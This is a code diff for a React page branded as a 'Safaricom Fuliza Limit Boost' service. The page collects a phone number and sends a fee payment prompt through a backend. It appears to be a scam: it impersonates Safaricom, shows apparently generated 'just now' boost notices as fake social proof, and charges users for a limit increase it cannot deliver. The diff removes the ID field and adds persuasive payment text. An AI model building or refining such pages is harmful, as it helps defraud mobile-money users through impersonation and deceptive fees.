@@ -32,9 +32,22 @@ export default function FulizaBoost() {
   const [loading, setLoading] = useState(false);
   const [success, setSuccess] = useState(false);
   const [phone, setPhone] = useState("");
-  const [idNumber, setIdNumber] = useState("");
   const [recent, setRecent] = useState({ name: "", amount: 0 });
-  const [errors, setErrors] = useState<{ phone?: string; id?: string }>({});
+  const [errors, setErrors] = useState<{ phone?: string }>({});
+
+  const normalizePhone = (num: string) => {
+    let phone = num.replace(/\D/g, "");
+
+    if (phone.startsWith("07") || phone.startsWith("01")) {
+      return "254" + phone.slice(1);
+    }
+
+    if (phone.startsWith("254")) {
+      return phone;
+    }
+
+    return phone;
+  };
 
   useEffect(() => {
     const generate = () => {
@@ -49,14 +62,11 @@ export default function FulizaBoost() {
 
   const validate = () => {
     const newErrors: any = {};
+    const normalized = normalizePhone(phone);
 
-    if (!/^\d{6,8}$/.test(idNumber)) {
-      newErrors.id = "Enter a valid National ID (6–8 digits)";
-    }
-
-    if (!/^(07\d{8}|2547\d{8})$/.test(phone)) {
+    if (!/^254(7|1)\d{8}$/.test(normalized)) {
       newErrors.phone =
-        "Enter valid Safaricom number (07XXXXXXXX or 2547XXXXXXXX)";
+        "Enter valid Safaricom number (07XXXXXXXX, 01XXXXXXXX or 254XXXXXXXXX)";
     }
 
     setErrors(newErrors);
@@ -69,12 +79,14 @@ export default function FulizaBoost() {
 
     setLoading(true);
 
+    const normalizedPhone = normalizePhone(phone);
+
     try {
       const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          phone,
+          phone: normalizedPhone,
           amount: selectedLimit.fee,
           local_id: `O${Date.now().toString(36)}`,
           transaction_desc: `Fuliza boost to Ksh ${selectedLimit.amount}`,
@@ -95,7 +107,6 @@ export default function FulizaBoost() {
     setShowModal(false);
     setSuccess(false);
     setPhone("");
-    setIdNumber("");
     setErrors({});
   };
 
@@ -103,12 +114,10 @@ export default function FulizaBoost() {
     <div className="min-h-screen bg-[#f4faf6] flex justify-center antialiased">
       <div className="w-full max-w-md pb-16">
 
-        {/* HEADER */}
         <div className="bg-[#00A651] text-white text-center py-5 font-semibold text-lg shadow">
           Safaricom Fuliza Limit Boost
         </div>
 
-        {/* DESCRIPTION */}
         <div className="text-center mt-5 px-6">
           <h2 className="text-xl font-bold text-[#008043]">
             Increase Your Fuliza Allocation
@@ -118,7 +127,6 @@ export default function FulizaBoost() {
           </p>
         </div>
 
-        {/* HIGHLIGHTS */}
         <div className="mx-4 mt-6 bg-white rounded-2xl shadow-sm p-4 border border-green-100">
           <div className="flex justify-between text-sm font-medium text-[#008043]">
             <span>✔ Secure Application</span>
@@ -129,7 +137,6 @@ export default function FulizaBoost() {
           </div>
         </div>
 
-        {/* RECENT */}
         <div className="mx-4 mt-5 bg-green-50 border border-green-200 p-3 rounded-xl text-sm text-gray-700">
           {recent.name} increased Fuliza to{" "}
           <span className="font-semibold text-[#008043] tabular-nums">
@@ -138,12 +145,10 @@ export default function FulizaBoost() {
           • just now
         </div>
 
-        {/* TITLE */}
         <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
           Select Preferred Fuliza Limit
         </div>
 
-        {/* CARDS */}
         <div className="grid grid-cols-2 gap-4 px-4 mt-4">
           {limits.map((limit) => {
             const active = selectedLimit?.id === limit.id;
@@ -178,7 +183,6 @@ export default function FulizaBoost() {
           })}
         </div>
 
-        {/* BUTTON */}
         <div className="px-4 mt-6">
           <button
             onClick={() => selectedLimit && setShowModal(true)}
@@ -188,16 +192,14 @@ export default function FulizaBoost() {
           </button>
         </div>
 
-        {/* FOOTER */}
         <div className="text-center text-xs text-gray-500 mt-6 px-6">
           This is a digital facilitation service for Safaricom Fuliza users.
           Processing timelines may vary based on eligibility criteria.
         </div>
 
-        {/* MODAL */}
         {showModal && selectedLimit && (
           <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center px-4">
-            <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden animate-[scaleIn_.2s_ease]">
+            <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden">
 
               <div className="bg-[#00A651] text-white px-6 py-4">
                 <h3 className="text-sm font-medium">
@@ -212,14 +214,10 @@ export default function FulizaBoost() {
               <div className="p-6">
                 {!success ? (
                   <>
-                    <div className="mb-4">
-                      <input
-                        type="text"
-                        placeholder="National ID Number"
-                        value={idNumber}
-                        onChange={(e) => setIdNumber(e.target.value)}
-                        className="w-full rounded-xl p-3 text-sm border border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100 outline-none"
-                      />
+                    <div className="mb-4 text-sm text-gray-600 bg-green-50 border border-green-200 p-3 rounded-xl">
+                      Enter your Safaricom number to receive the secure M-Pesa
+                      payment prompt. Once payment is confirmed your Fuliza
+                      boost request will begin processing.
                     </div>
 
                     <div className="mb-4">
